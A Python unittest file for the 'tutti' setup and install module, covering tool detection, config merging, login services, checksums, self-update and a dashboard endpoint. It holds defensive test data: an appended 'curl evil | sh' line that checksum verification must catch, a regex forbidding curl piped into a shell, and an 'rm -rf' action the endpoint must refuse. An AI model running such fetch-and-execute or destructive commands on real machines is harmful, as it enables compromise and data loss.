"""`tutti setup` and the install module: detection over fake PATHs, ssh configs and adb output; the config round-trip and
idempotency; the login service per OS; checksums of the bootstrap and of releases; self-update; the dashboard's /api/setup."""
import io
import json
import os
import stat
import tarfile
import tempfile
import unittest
from datetime import datetime, timezone
from types import SimpleNamespace

import yaml

from tutti import config, configmerge, dashboard, guided, install, setup, setupcmd

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
NOW = datetime(2026, 11, 14, 12, tzinfo=timezone.utc)


def fake_bin(d, name, out='', code=0):
    p = os.path.join(d, name)
    with open(p, 'w', encoding='utf8') as f:
        f.write(f"#!/bin/sh\n/bin/cat <<'EOF'\n{out}\nEOF\nexit {code}\n")
    os.chmod(p, stat.S_IRWXU)


class World:
    """A fake home and PATH: programs that print canned answers."""

    def __init__(self, t):
        self.home = os.path.join(t, 'home')
        self.bin = os.path.join(t, 'bin')
        os.makedirs(self.bin)
        os.makedirs(os.path.join(self.home, '.ssh'))
        self.probe = setup.Probe(path=self.bin, home=self.home)

    def file(self, rel, text=''):
        p = os.path.join(self.home, rel)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, 'w', encoding='utf8') as f:
            f.write(text)
        return p

    def repo(self, rel, when):
        self.file(f'{rel}/.git/HEAD', 'ref: refs/heads/main\n')
        for f in ('HEAD',):
            os.utime(os.path.join(self.home, rel, '.git', f), (when, when))


class Asked(setupcmd.Asker):
    def __init__(self, answers=None):
        super().__init__(yes=False, read=self.answer)
        self.answers, self.questions = list(answers or []), []

    def answer(self, q):
        self.questions.append(q)
        return self.answers.pop(0) if self.answers else ''


class Detection(unittest.TestCase):
    def setUp(self):
        self.t = tempfile.TemporaryDirectory()
        self.w = World(self.t.name)

    def tearDown(self):
        self.t.cleanup()

    def test_agents_logins_and_plans(self):
        fake_bin(self.w.bin, 'cursor-agent', 'Not logged in')
        fake_bin(self.w.bin, 'claude')
        self.w.file('.claude/.credentials.json', '{}')
        found = {a['name']: a for a in setup.agents(self.w.probe)}
        self.assertEqual(found['claude']['login'], 'yes')
        self.assertEqual(found['cursor']['login'], 'no')
        self.assertEqual(found['cursor']['login_command'], ['cursor-agent', 'login'])
        self.assertNotIn('copilot', found)

    def test_a_signed_in_cursor_and_its_plan(self):
        p = os.path.join(self.w.bin, 'cursor-agent')
        with open(p, 'w', encoding='utf8') as f:   # `status` and `about --format json` answer differently
            f.write('#!/bin/sh\nif [ "$1" = status ]; then echo "Logged in as someone"; else echo \'{"subscriptionTier": "Pro"}\'; fi\n')
        os.chmod(p, stat.S_IRWXU)
        a = setup.agents(self.w.probe)[0]
        self.assertEqual((a['login'], a['plan']), ('yes', 'Pro'))

    def test_nothing_installed(self):
        found = setup.detect(self.w.probe)
        self.assertEqual((found['agents'], found['ollama'], found['gpus'], found['devices'], found['gh']), ([], None, [], [], 'missing'))

    def test_gpus_models_and_gh(self):
        fake_bin(self.w.bin, 'nvidia-smi', 'NVIDIA GeForce RTX 3080, 10240')
        fake_bin(self.w.bin, 'ollama', 'NAME ID SIZE\nqwen3:8b abc 5 GB\nllama3:70b def 40 GB')
        fake_bin(self.w.bin, 'gh', 'not logged in', code=1)
        found = setup.detect(self.w.probe)
        self.assertEqual(found['gpus'], [{'name': 'NVIDIA GeForce RTX 3080', 'memory_gb': 10}])
        self.assertEqual(found['ollama'], ['qwen3:8b', 'llama3:70b'])
        self.assertEqual(found['gh'], 'no')

    def test_machines_from_ssh_tailscale_and_lan(self):
        self.w.file('.ssh/config', 'Host *\n  User me\nHost builder builder.example\nHost github.com\nHost gpu-box\n')
        peers = {'Peer': {'k1': {'HostName': 'GPU-Box', 'Online': True, 'OS': 'linux'},
                          'k2': {'HostName': 'laptop', 'Online': False, 'OS': 'windows'}}}
        fake_bin(self.w.bin, 'tailscale', json.dumps(peers))
        fake_bin(self.w.bin, 'avahi-browse', '+;eth0;IPv4;nas;_ssh._tcp;local\n=;eth0;IPv4;nas;_ssh._tcp;local;nas.local;10.0.0.5;22;')
        ms = setup.machines(self.w.probe, me='laptop')
        self.assertEqual([(m['name'], m['source']) for m in ms], [('builder', 'ssh'), ('gpu-box', 'ssh'), ('nas', 'lan')])

    def test_bad_inputs_are_ignored(self):
        self.assertEqual(setup.tailscale_peers('not json'), [])
        self.assertEqual(setup.ssh_hosts('Host !bad *.x ?y\n'), [])
        self.assertEqual(setup.adb_devices('List of devices attached\n* daemon started\n'), [])

    def test_adb_devices(self):
        out = 'List of devices attached\nR58M00TEST00   device usb:1-1 product:x model:Pixel_8 device:y\n10.0.0.7:5555 unauthorized\n'
        self.assertEqual(setup.adb_devices(out), [{'serial': 'R58M00TEST00', 'state': 'device', 'model': 'Pixel_8'},
                                                 {'serial': '10.0.0.7:5555', 'state': 'unauthorized', 'model': ''}])

    def test_repos_most_recent_first_and_worktrees_skipped(self):
        self.w.repo('Projects/old', 1_000)
        self.w.repo('Projects/new', 2_000)
        self.w.file('Projects/wt/.git', 'gitdir: /elsewhere\n')
        self.w.repo('src/new', 500)   # the same name elsewhere is listed once
        rs = setup.repos(self.w.probe)
        self.assertEqual([(r['name'], r['priority']) for r in rs], [('new', 0), ('old', 1)])


class ConfigRoundTrip(unittest.TestCase):
    FOUND = {'agents': [{'name': 'claude', 'bin': 'claude', 'login': 'yes', 'plan': None, 'login_command': ['claude', '/login']},
                        {'name': 'copilot', 'bin': 'copilot', 'login': 'no', 'plan': None, 'login_command': ['copilot']}],
             'ollama': ['qwen3:8b'], 'gpus': [], 'git': True, 'gh': 'yes',
             'machines': [{'name': 'builder', 'host': 'builder.example', 'source': 'ssh'}],
             'devices': [{'serial': 'R58', 'state': 'device', 'model': 'Pixel_8'}],
             'repos': [{'name': 'app', 'path': '~/Projects/app', 'priority': 0},
                       {'name': 'tool', 'path': '~/Projects/tool', 'priority': 1}]}
    EXISTING = '# my own notes\nmachines:\n  # the quiet one\n  box: {host: box.example}   # keep me\n\n# workers below\nworkers: {}\n'

    def test_new_config_checks_out_with_priorities(self):
        add, why, top = setupcmd.plan(self.FOUND, {}, Asked(['max5']), NOW)
        text, stuck = setupcmd.apply('', add, why, top)
        raw = yaml.safe_load(text)
        self.assertEqual(stuck, [])
        self.assertEqual(config.validate(config.normalise(raw)), [])
        self.assertEqual(raw['main'], {'agent': 'claude'})
        self.assertEqual(raw['accounts']['claude']['subscription'], 'max5')
        self.assertEqual(raw['projects']['app'], {'match': 'app', 'priority': 0})
        self.assertTrue(raw['workers']['copilot']['costs_money'])
        self.assertEqual(raw['workers']['local']['model'], 'qwen3:8b')
        self.assertEqual(set(raw['machines']), {'here', 'builder'})
        self.assertEqual(raw['self_update'], {'enabled': True})
        self.assertTrue(text.startswith(configmerge.HEADER))

    def test_comments_kept_and_second_run_adds_nothing(self):
        asker = Asked()
        add, why, top = setupcmd.plan(self.FOUND, yaml.safe_load(self.EXISTING), asker, NOW)
        self.assertNotIn('here', add.get('machines', {}))   # machines exist: no `here` added
        text, _ = setupcmd.apply(self.EXISTING, add, why, top)
        for kept in ('# my own notes', '# the quiet one', 'box: {host: box.example}   # keep me', '# workers below'):
            self.assertIn(kept, text)
        self.assertLess(text.index('box:'), text.index('builder:'))
        self.assertLess(text.index('builder:'), text.index('# workers below'))
        again = setupcmd.plan(self.FOUND, yaml.safe_load(text), Asked(), NOW)
        self.assertEqual(again, ({}, {}, {}))

    def test_refused_offers_add_nothing(self):
        add, _, _ = setupcmd.plan(self.FOUND, {'accounts': {'claude': {}, 'copilot': {}}}, Asked(['n', 'n']), NOW)
        self.assertNotIn('builder', add['machines'])
        self.assertNotIn('projects', add)

    def test_names_with_dots_and_odd_values_round_trip(self):
        text = configmerge.add('', 'projects', {'site.github.io': {'match': 'a: b'}, 'x': 'yes'})
        self.assertEqual(yaml.safe_load(text)['projects'], {'site.github.io': {'match': 'a: b'}, 'x': 'yes'})

    def test_inline_section_is_reported_not_broken(self):
        text = 'machines: {box: {host: b}}\n'
        self.assertIsNone(configmerge.add(text, 'machines', {'x': {'host': 'x'}}))
        _, stuck = setupcmd.apply(text, {'machines': {'x': {'host': 'x'}}}, {}, {})
        self.assertEqual(stuck, ['machines'])

    def test_write_refuses_a_config_that_does_not_check_out(self):
        with tempfile.TemporaryDirectory() as t:
            with self.assertRaises(config.ConfigError):
                setupcmd.write_config(os.path.join(t, 'c.yaml'), 'routing: {order: [nowhere]}\n')

    def test_by_default_nothing_is_asked_and_the_defaults_are_recorded(self):
        asker = setupcmd.Asker(read=lambda q: self.fail(f'asked: {q}'))
        add, _, top = setupcmd.plan(self.FOUND, {}, asker, NOW)
        keys = {c['key']: c['value'] for c in setupcmd.plan.choices}
        self.assertEqual(keys['accounts.claude.subscription'], 'pro')
        self.assertEqual(keys['main.agent'], 'claude')
        self.assertIn('machines.builder', keys)
        self.assertIn('builder', add['machines'])
        rows = guided.choice_rows(setupcmd.plan.choices)
        self.assertTrue(all(r['state'] == 'default' and r['change'] for r in rows))

    def test_yes_takes_every_default_and_asks_nothing(self):
        asker = setupcmd.Asker(yes=True, read=lambda q: self.fail('asked'))
        self.assertTrue(asker.confirm('x?'))
        self.assertEqual(asker.ask('plan?', 'pro'), 'pro')


class Service(unittest.TestCase):
    def test_linux_unit(self):
        files, cmds = install.service_plan('linux', '/h/.local/share/tutti', env={'XDG_CONFIG_HOME': '/h/.config'})
        path, text = files[0]
        self.assertEqual(path, '/h/.config/systemd/user/tutti-dashboard.service')
        self.assertIn('self-update --auto; exec', text)
        self.assertIn('WantedBy=default.target', text)
        self.assertEqual(cmds[-1], ['systemctl', '--user', 'enable', '--now', 'tutti-dashboard.service'])

    def test_the_service_runs_the_given_tutti(self):
        files, _ = install.service_plan('linux', '/h', env={}, tutti='/opt/bin/tutti')
        self.assertIn('"/opt/bin/tutti" dashboard', files[0][1])

    def test_macos_agent(self):
        files, cmds = install.service_plan('darwin', '/h')
        self.assertTrue(files[0][0].endswith('Library/LaunchAgents/io.github.tutti.dashboard.plist'))
        self.assertIn('<key>RunAtLoad</key><true/>', files[0][1])
        self.assertEqual(cmds[-1][:3], ['launchctl', 'load', '-w'])

    def test_windows_task(self):
        files, cmds = install.service_plan('win32', '/h')
        names = [os.path.basename(p) for p, _ in files]
        self.assertEqual(names, ['dashboard.cmd', 'dashboard.vbs'])
        self.assertIn('self-update --auto', files[0][1])
        self.assertIn(', 0, False', files[1][1])   # no console window
        self.assertIn('ONLOGON', cmds[0])
        self.assertIn('LIMITED', cmds[0])   # the user's own rights, no admin

    def test_install_once_then_unchanged(self):
        ran = []

        def run(argv, **_):
            ran.append(argv)
            return SimpleNamespace(returncode=0, stdout='', stderr='')
        with tempfile.TemporaryDirectory() as t:
            env = {'XDG_CONFIG_HOME': t}
            old = os.environ.get('XDG_CONFIG_HOME')
            os.environ['XDG_CONFIG_HOME'] = t
            try:
                self.assertEqual(setupcmd.service('linux', t, run)[0], 'ok')
                n = len(ran)
                self.assertEqual(setupcmd.service('linux', t, run)[0], 'ok')
                self.assertEqual(len(ran), n + 1)   # only the systemd check: nothing rewritten or restarted
            finally:
                os.environ.pop('XDG_CONFIG_HOME') if old is None else os.environ.update(XDG_CONFIG_HOME=old)
            self.assertTrue(os.path.exists(install.service_plan('linux', t, env)[0][0][0]))

    def test_from_the_dashboard_it_is_enabled_not_started(self):
        ran = []

        def run(argv, **_):
            ran.append(argv)
            return SimpleNamespace(returncode=0, stdout='', stderr='')
        with tempfile.TemporaryDirectory() as t:
            old = os.environ.get('XDG_CONFIG_HOME')
            os.environ['XDG_CONFIG_HOME'] = t
            try:
                self.assertEqual(setupcmd.service('linux', t, run, start=False)[0], 'ok')
            finally:
                os.environ.pop('XDG_CONFIG_HOME') if old is None else os.environ.update(XDG_CONFIG_HOME=old)
        self.assertIn(['systemctl', '--user', 'enable', 'tutti-dashboard.service'], ran)
        self.assertNotIn('--now', sum(ran, []))

    def test_no_systemd_user_session(self):
        def run(argv, **_):
            return SimpleNamespace(returncode=1, stdout='', stderr='Failed to connect to bus')
        self.assertIn('wsl.conf', setupcmd.service('wsl', '/nowhere', run)[1])
        self.assertEqual(setupcmd.service('linux', '/nowhere', run)[0], 'todo')


class Checksums(unittest.TestCase):
    def test_docs_carry_the_bootstraps_real_checksums(self):
        for doc in ('README.md', 'docs/INSTALL.md'):
            with open(os.path.join(ROOT, doc), encoding='utf8') as f:
                text = f.read()
            for platform in ('linux', 'win32'):
                self.assertIn(install.install_line(platform), text,
                              f'{doc}: the {platform} install line is stale; print it with install.install_line({platform!r})')

    def test_join_is_passed_through(self):
        self.assertTrue(install.install_line('linux', join='tutti-hh:a:1:X').endswith('bash tutti-bootstrap.sh --join "tutti-hh:a:1:X"'))
        self.assertIn('-Join "tutti-hh:a:1:X"', install.install_line('win32', join='tutti-hh:a:1:X'))

    def test_bootstrap_pins_versions_and_never_pipes_into_a_shell(self):
        with open(os.path.join(ROOT, 'install', 'bootstrap.sh'), encoding='utf8') as f:
            text = f.read()
        self.assertIn('UV_VERSION=0.13.8', text)
        self.assertNotRegex(text, r'curl[^\n|]*\|\s*(ba)?sh')
        self.assertEqual(len(__import__('re').findall(r'\b[0-9a-f]{64}\b', text)), 8)   # uv and gh, four platforms each

    def test_verify_good_bad_and_missing(self):
        with tempfile.TemporaryDirectory() as t:
            p = os.path.join(t, 'bootstrap.sh')
            with open(p, 'w', encoding='utf8') as f:
                f.write('echo hi\n')
            sums = install.parse_sums(f'{install.sha256_of(p)}  bootstrap.sh\n{"0" * 64} *other.tar.gz\nnot a line\n')
            self.assertEqual(set(sums), {'bootstrap.sh', 'other.tar.gz'})
            self.assertIsNone(install.verify(p, sums))
            with open(p, 'a', encoding='utf8') as f:
                f.write('curl evil | sh\n')
            self.assertIn('altered', install.verify(p, sums))
            self.assertIn('not listed', install.verify(p, {}))

    def test_newest(self):
        self.assertEqual(install.newest({'tutti-0.1.9.tar.gz': 'a', 'tutti-0.1.10.tar.gz': 'b', 'bootstrap.sh': 'c'}), '0.1.10')
        self.assertIsNone(install.newest({'bootstrap.sh': 'c'}))


def release(t, version):
    """A release tarball and its SHA256SUMS, as release-assets.sh makes them."""
    src = os.path.join(t, f'tutti-{version}')
    os.makedirs(os.path.join(src, 'bin'))
    with open(os.path.join(src, 'requirements.txt'), 'w', encoding='utf8') as f:
        f.write('')
    tarball = os.path.join(t, f'tutti-{version}.tar.gz')
    with tarfile.open(tarball, 'w:gz') as tf:
        tf.add(src, arcname=f'tutti-{version}')
    return tarball, f'{install.sha256_of(tarball)}  tutti-{version}.tar.gz\n'


class SelfUpdate(unittest.TestCase):
    def fetcher(self, tarball, sums):
        def fetch(url, dest=None):
            if dest is None:
                return sums
            with open(tarball, 'rb') as s, open(dest, 'wb') as d:
                d.write(s.read())
            return dest
        return fetch

    def test_installs_a_newer_release_and_points_current(self):
        with tempfile.TemporaryDirectory() as t:
            tarball, sums = release(t, '9.9.9')
            orig = install.requirements
            install.requirements = lambda h, v: True
            try:
                code, msg = install.self_update(os.path.join(t, 'home'), '0.1.0', self.fetcher(tarball, sums))
            finally:
                install.requirements = orig
            self.assertEqual(code, 0, msg)
            self.assertIn('0.1.0 -> 9.9.9', msg)
            current = os.path.realpath(os.path.join(t, 'home', 'current'))
            self.assertTrue(current.endswith(os.path.join('versions', '9.9.9')))
            self.assertTrue(os.path.isfile(os.path.join(current, 'requirements.txt')))
            self.assertTrue(install.is_release_install(os.path.join(t, 'home', 'current'), os.path.join(t, 'home')))
            self.assertFalse(install.is_release_install(os.path.join(t, 'home'), os.path.join(t, 'home')))

    def test_a_bad_checksum_changes_nothing(self):
        with tempfile.TemporaryDirectory() as t:
            tarball, _ = release(t, '9.9.9')
            code, msg = install.self_update(os.path.join(t, 'home'), '0.1.0', self.fetcher(tarball, f'{"0" * 64}  tutti-9.9.9.tar.gz\n'))
            self.assertEqual(code, 1)
            self.assertIn('nothing was installed', msg)
            self.assertFalse(os.path.lexists(os.path.join(t, 'home', 'current')))

    def test_up_to_date_and_offline(self):
        self.assertEqual(install.self_update('/nowhere', '9.9.9', lambda u, d=None: f'{"0" * 64}  tutti-1.0.0.tar.gz\n')[0], 0)

        def offline(url, dest=None):
            raise OSError('no network')
        code, msg = install.self_update('/nowhere', '1.0.0', offline)
        self.assertEqual(code, 1)
        self.assertIn('offline', msg)

    def test_daily_only_for_an_enabled_release_install(self):
        import threading
        stop = threading.Event()
        self.assertIsNone(install.start_daily({'self_update': {'enabled': False}}, stop, '/x', lambda: None))
        self.assertIsNone(install.start_daily({}, stop, ROOT, lambda: None))   # a checkout updates with git


class GitFix(unittest.TestCase):
    def test_wrapper_for_a_broken_first_git(self):
        with tempfile.TemporaryDirectory() as t:
            user_bin, bad_dir = os.path.join(t, 'bin'), os.path.join(t, 'tool')
            os.makedirs(user_bin)
            msg = f'{bad_dir}/git cannot do HTTPS ("x"), so ...; /usr/bin/git works'
            state, detail = setupcmd.fix_git([msg], path=os.pathsep.join([user_bin, bad_dir]), bin_dir=user_bin)
            self.assertEqual(state, 'ok', detail)
            with open(os.path.join(user_bin, 'git'), encoding='utf8') as f:
                self.assertIn('exec "/usr/bin/git"', f.read())

    def test_no_working_git_is_left_to_do(self):
        self.assertEqual(setupcmd.fix_git(['no git in PATH: install git'])[0], 'todo')
        self.assertEqual(setupcmd.fix_git([])[0], 'ok')


class HumanSteps(unittest.TestCase):
    def test_only_what_no_tool_can_do_listed_once_sign_ins_first(self):
        rows = [setupcmd.item('git', 'git', 'todo', 'missing', 'sudo apt install git'),
                setupcmd.item('login-cursor', 'cursor sign-in', 'todo', 'not signed in', 'cursor-agent login'),
                setupcmd.item('device-R1', 'Android R1', 'todo', 'tap Allow on the phone', 'adb devices'),
                setupcmd.item('login-agy', 'agy sign-in', 'info', 'cannot tell', 'agy'),
                setupcmd.item('gpus', 'GPUs', 'info', 'RTX')]
        steps = setupcmd.human_steps(rows, {})
        self.assertEqual([s['kind'] for s in steps], ['sudo', 'sign-in', 'phone'])
        text = guided.render(steps)
        self.assertTrue(text.startswith('Left for you (3)'))
        self.assertLess(text.index('cursor sign-in'), text.index('git'))
        self.assertEqual(guided.render([]), 'Nothing left for you: everything is set up.')

    def test_sign_ins_open_each_tool_once(self):
        ran = []
        steps = [guided.step('sign-in', 'cursor', 'cursor-agent login', 'x'), guided.step('sudo', 'git', 'sudo apt install git', 'y'),
                 guided.step('sign-in', 'gh', 'gh auth login --web', 'z')]
        setupcmd.sign_ins(steps, lambda argv, **k: ran.append(argv), io.StringIO())
        self.assertEqual(ran, [['cursor-agent', 'login'], ['gh', 'auth', 'login', '--web', '--git-protocol', 'https']])

    def test_a_bad_kind_is_refused(self):
        with self.assertRaises(ValueError):
            guided.step('password', 't', None, 'w')


class Report(unittest.TestCase):
    def test_rows_say_what_is_left(self):
        found = dict(ConfigRoundTrip.FOUND, gh='no', gpus=[{'name': 'RTX', 'memory_gb': 10}],
                     machines=[{'name': 'nas', 'host': 'nas.local', 'source': 'lan'}],
                     devices=[{'serial': 'R1', 'state': 'unauthorized', 'model': ''}])
        rows = {r['id']: r for r in setupcmd.report_items(found, {}, ('ok', 's'), ('ok', 'u'), ('ok', 'g'), ['machines'])}
        self.assertEqual(rows['login-claude']['state'], 'ok')
        self.assertEqual((rows['login-copilot']['state'], rows['login-copilot']['command']), ('todo', 'copilot'))
        self.assertEqual(rows['gh']['command'], 'gh auth login --web')
        self.assertEqual(rows['machine-nas']['command'], 'ssh-copy-id nas.local')
        self.assertEqual(rows['device-R1']['state'], 'todo')
        self.assertEqual(rows['config-machines']['state'], 'todo')
        self.assertEqual(rows['gpus']['detail'], 'RTX')


class DashboardSetup(unittest.TestCase):
    def setUp(self):
        self.t = tempfile.TemporaryDirectory()
        self.c = SimpleNamespace(cfg=config.normalise({'project': {'state': self.t.name}}))

    def tearDown(self):
        self.t.cleanup()

    def test_run_starts_setup_yes_in_the_background(self):
        started = []
        code, answer = dashboard.run_setup(self.c, b'{"action": "run"}', popen=lambda argv, **kw: started.append(argv))
        self.assertEqual(code, 202)
        self.assertEqual(started[0][-3:], ['setup', '--yes', '--from-dashboard'])

    def test_a_setup_that_cannot_start_says_what_to_do(self):
        def popen(*a, **k):
            raise OSError('no such file')
        code, answer = dashboard.run_setup(self.c, b'{"action": "run"}', popen=popen)
        self.assertEqual(code, 500)
        self.assertIn('tutti setup', answer['error'])

    def test_anything_else_is_refused(self):
        for body in (b'{"action": "rm -rf"}', b'nope', b'[]'):
            self.assertEqual(dashboard.run_setup(self.c, body, popen=lambda *a, **k: self.fail('ran'))[0], 400)

    def test_the_card_reads_the_saved_report(self):
        self.assertIsNone(setupcmd.read_report(self.c.cfg))
        setupcmd.save_report(self.c.cfg, [setupcmd.item('gh', 'GitHub', 'todo', 'x', 'gh auth login --web')], '/c.yaml')
        r = setupcmd.read_report(self.c.cfg)
        self.assertEqual((r['left'], r['items'][0]['id']), (1, 'gh'))
        self.assertIn('bootstrap.sh', r['install_lines']['linux'])


class Connect(unittest.TestCase):
    def test_connected_agents_become_rows(self):
        from tutti import connect
        orig = connect.connect_all
        connect.connect_all = lambda path: [{'agent': 'claude', 'status': 'connected', 'note': ''},
                                            {'agent': 'gemini', 'status': 'needs-restart', 'note': 'Start a new Gemini CLI session.'},
                                            {'agent': 'codex', 'status': 'not-installed', 'note': 'x'},
                                            {'agent': 'cursor', 'status': 'error', 'note': 'bad json'}]
        try:
            steps = []
            rows = {r['id']: r for r in setupcmd.connect_rows('/c.yaml', steps)}
        finally:
            connect.connect_all = orig
        self.assertEqual(rows['connect-claude']['state'], 'ok')
        self.assertNotIn('connect-codex', rows)
        self.assertEqual((rows['connect-cursor']['state'], rows['connect-cursor']['command']), ('todo', 'tutti connect cursor'))
        self.assertEqual([(s['kind'], s['title']) for s in steps], [('other', 'Restart Gemini CLI')])
        self.assertIn('Start a new Gemini CLI session.', guided.render(steps))


class Run(unittest.TestCase):
    def test_first_run_then_idempotent(self):
        with tempfile.TemporaryDirectory() as t:
            w = World(t)
            fake_bin(w.bin, 'cursor-agent', 'Logged in as x')
            w.repo('Projects/app', 1_000)
            path = os.path.join(t, 'cfg', 'config.yaml')
            os.makedirs(os.path.dirname(path))
            with open(path, 'w', encoding='utf8') as f:   # the state folder in the test's own folder, never the owner's
                f.write(f'# mine\nproject: {{state: {json.dumps(os.path.join(t, "state"))}}}\n')
            a = SimpleNamespace(config=path, service=False, join=None, from_dashboard=False, connect=False)
            out = io.StringIO()
            self.assertEqual(setupcmd.run(a, probe=w.probe, platform='linux', home_dir=t, out=out), 0)
            with open(path, encoding='utf8') as f:
                first = f.read()
            self.assertIn('# mine', first)
            self.assertIn('  cursor: {kind: cli', first)
            self.assertIn('app: {match: app, priority: 0}', first)
            self.assertTrue(os.path.exists(path + '.bak'))
            self.assertTrue(os.path.exists(os.path.join(t, 'state', 'setup.json')))
            out = io.StringIO()
            setupcmd.run(a, probe=w.probe, platform='linux', home_dir=t, out=out)
            self.assertIn('already has everything', out.getvalue())
            with open(os.path.join(t, 'state', 'setup.json'), encoding='utf8') as f:
                kept = [r for r in json.load(f)['items'] if r['state'] == 'default']
            self.assertTrue(any(r['change'] == 'projects' for r in kept))   # the first run's defaults stay listed
            with open(path, encoding='utf8') as f:
                self.assertEqual(f.read(), first)


if __name__ == '__main__':
    unittest.main()
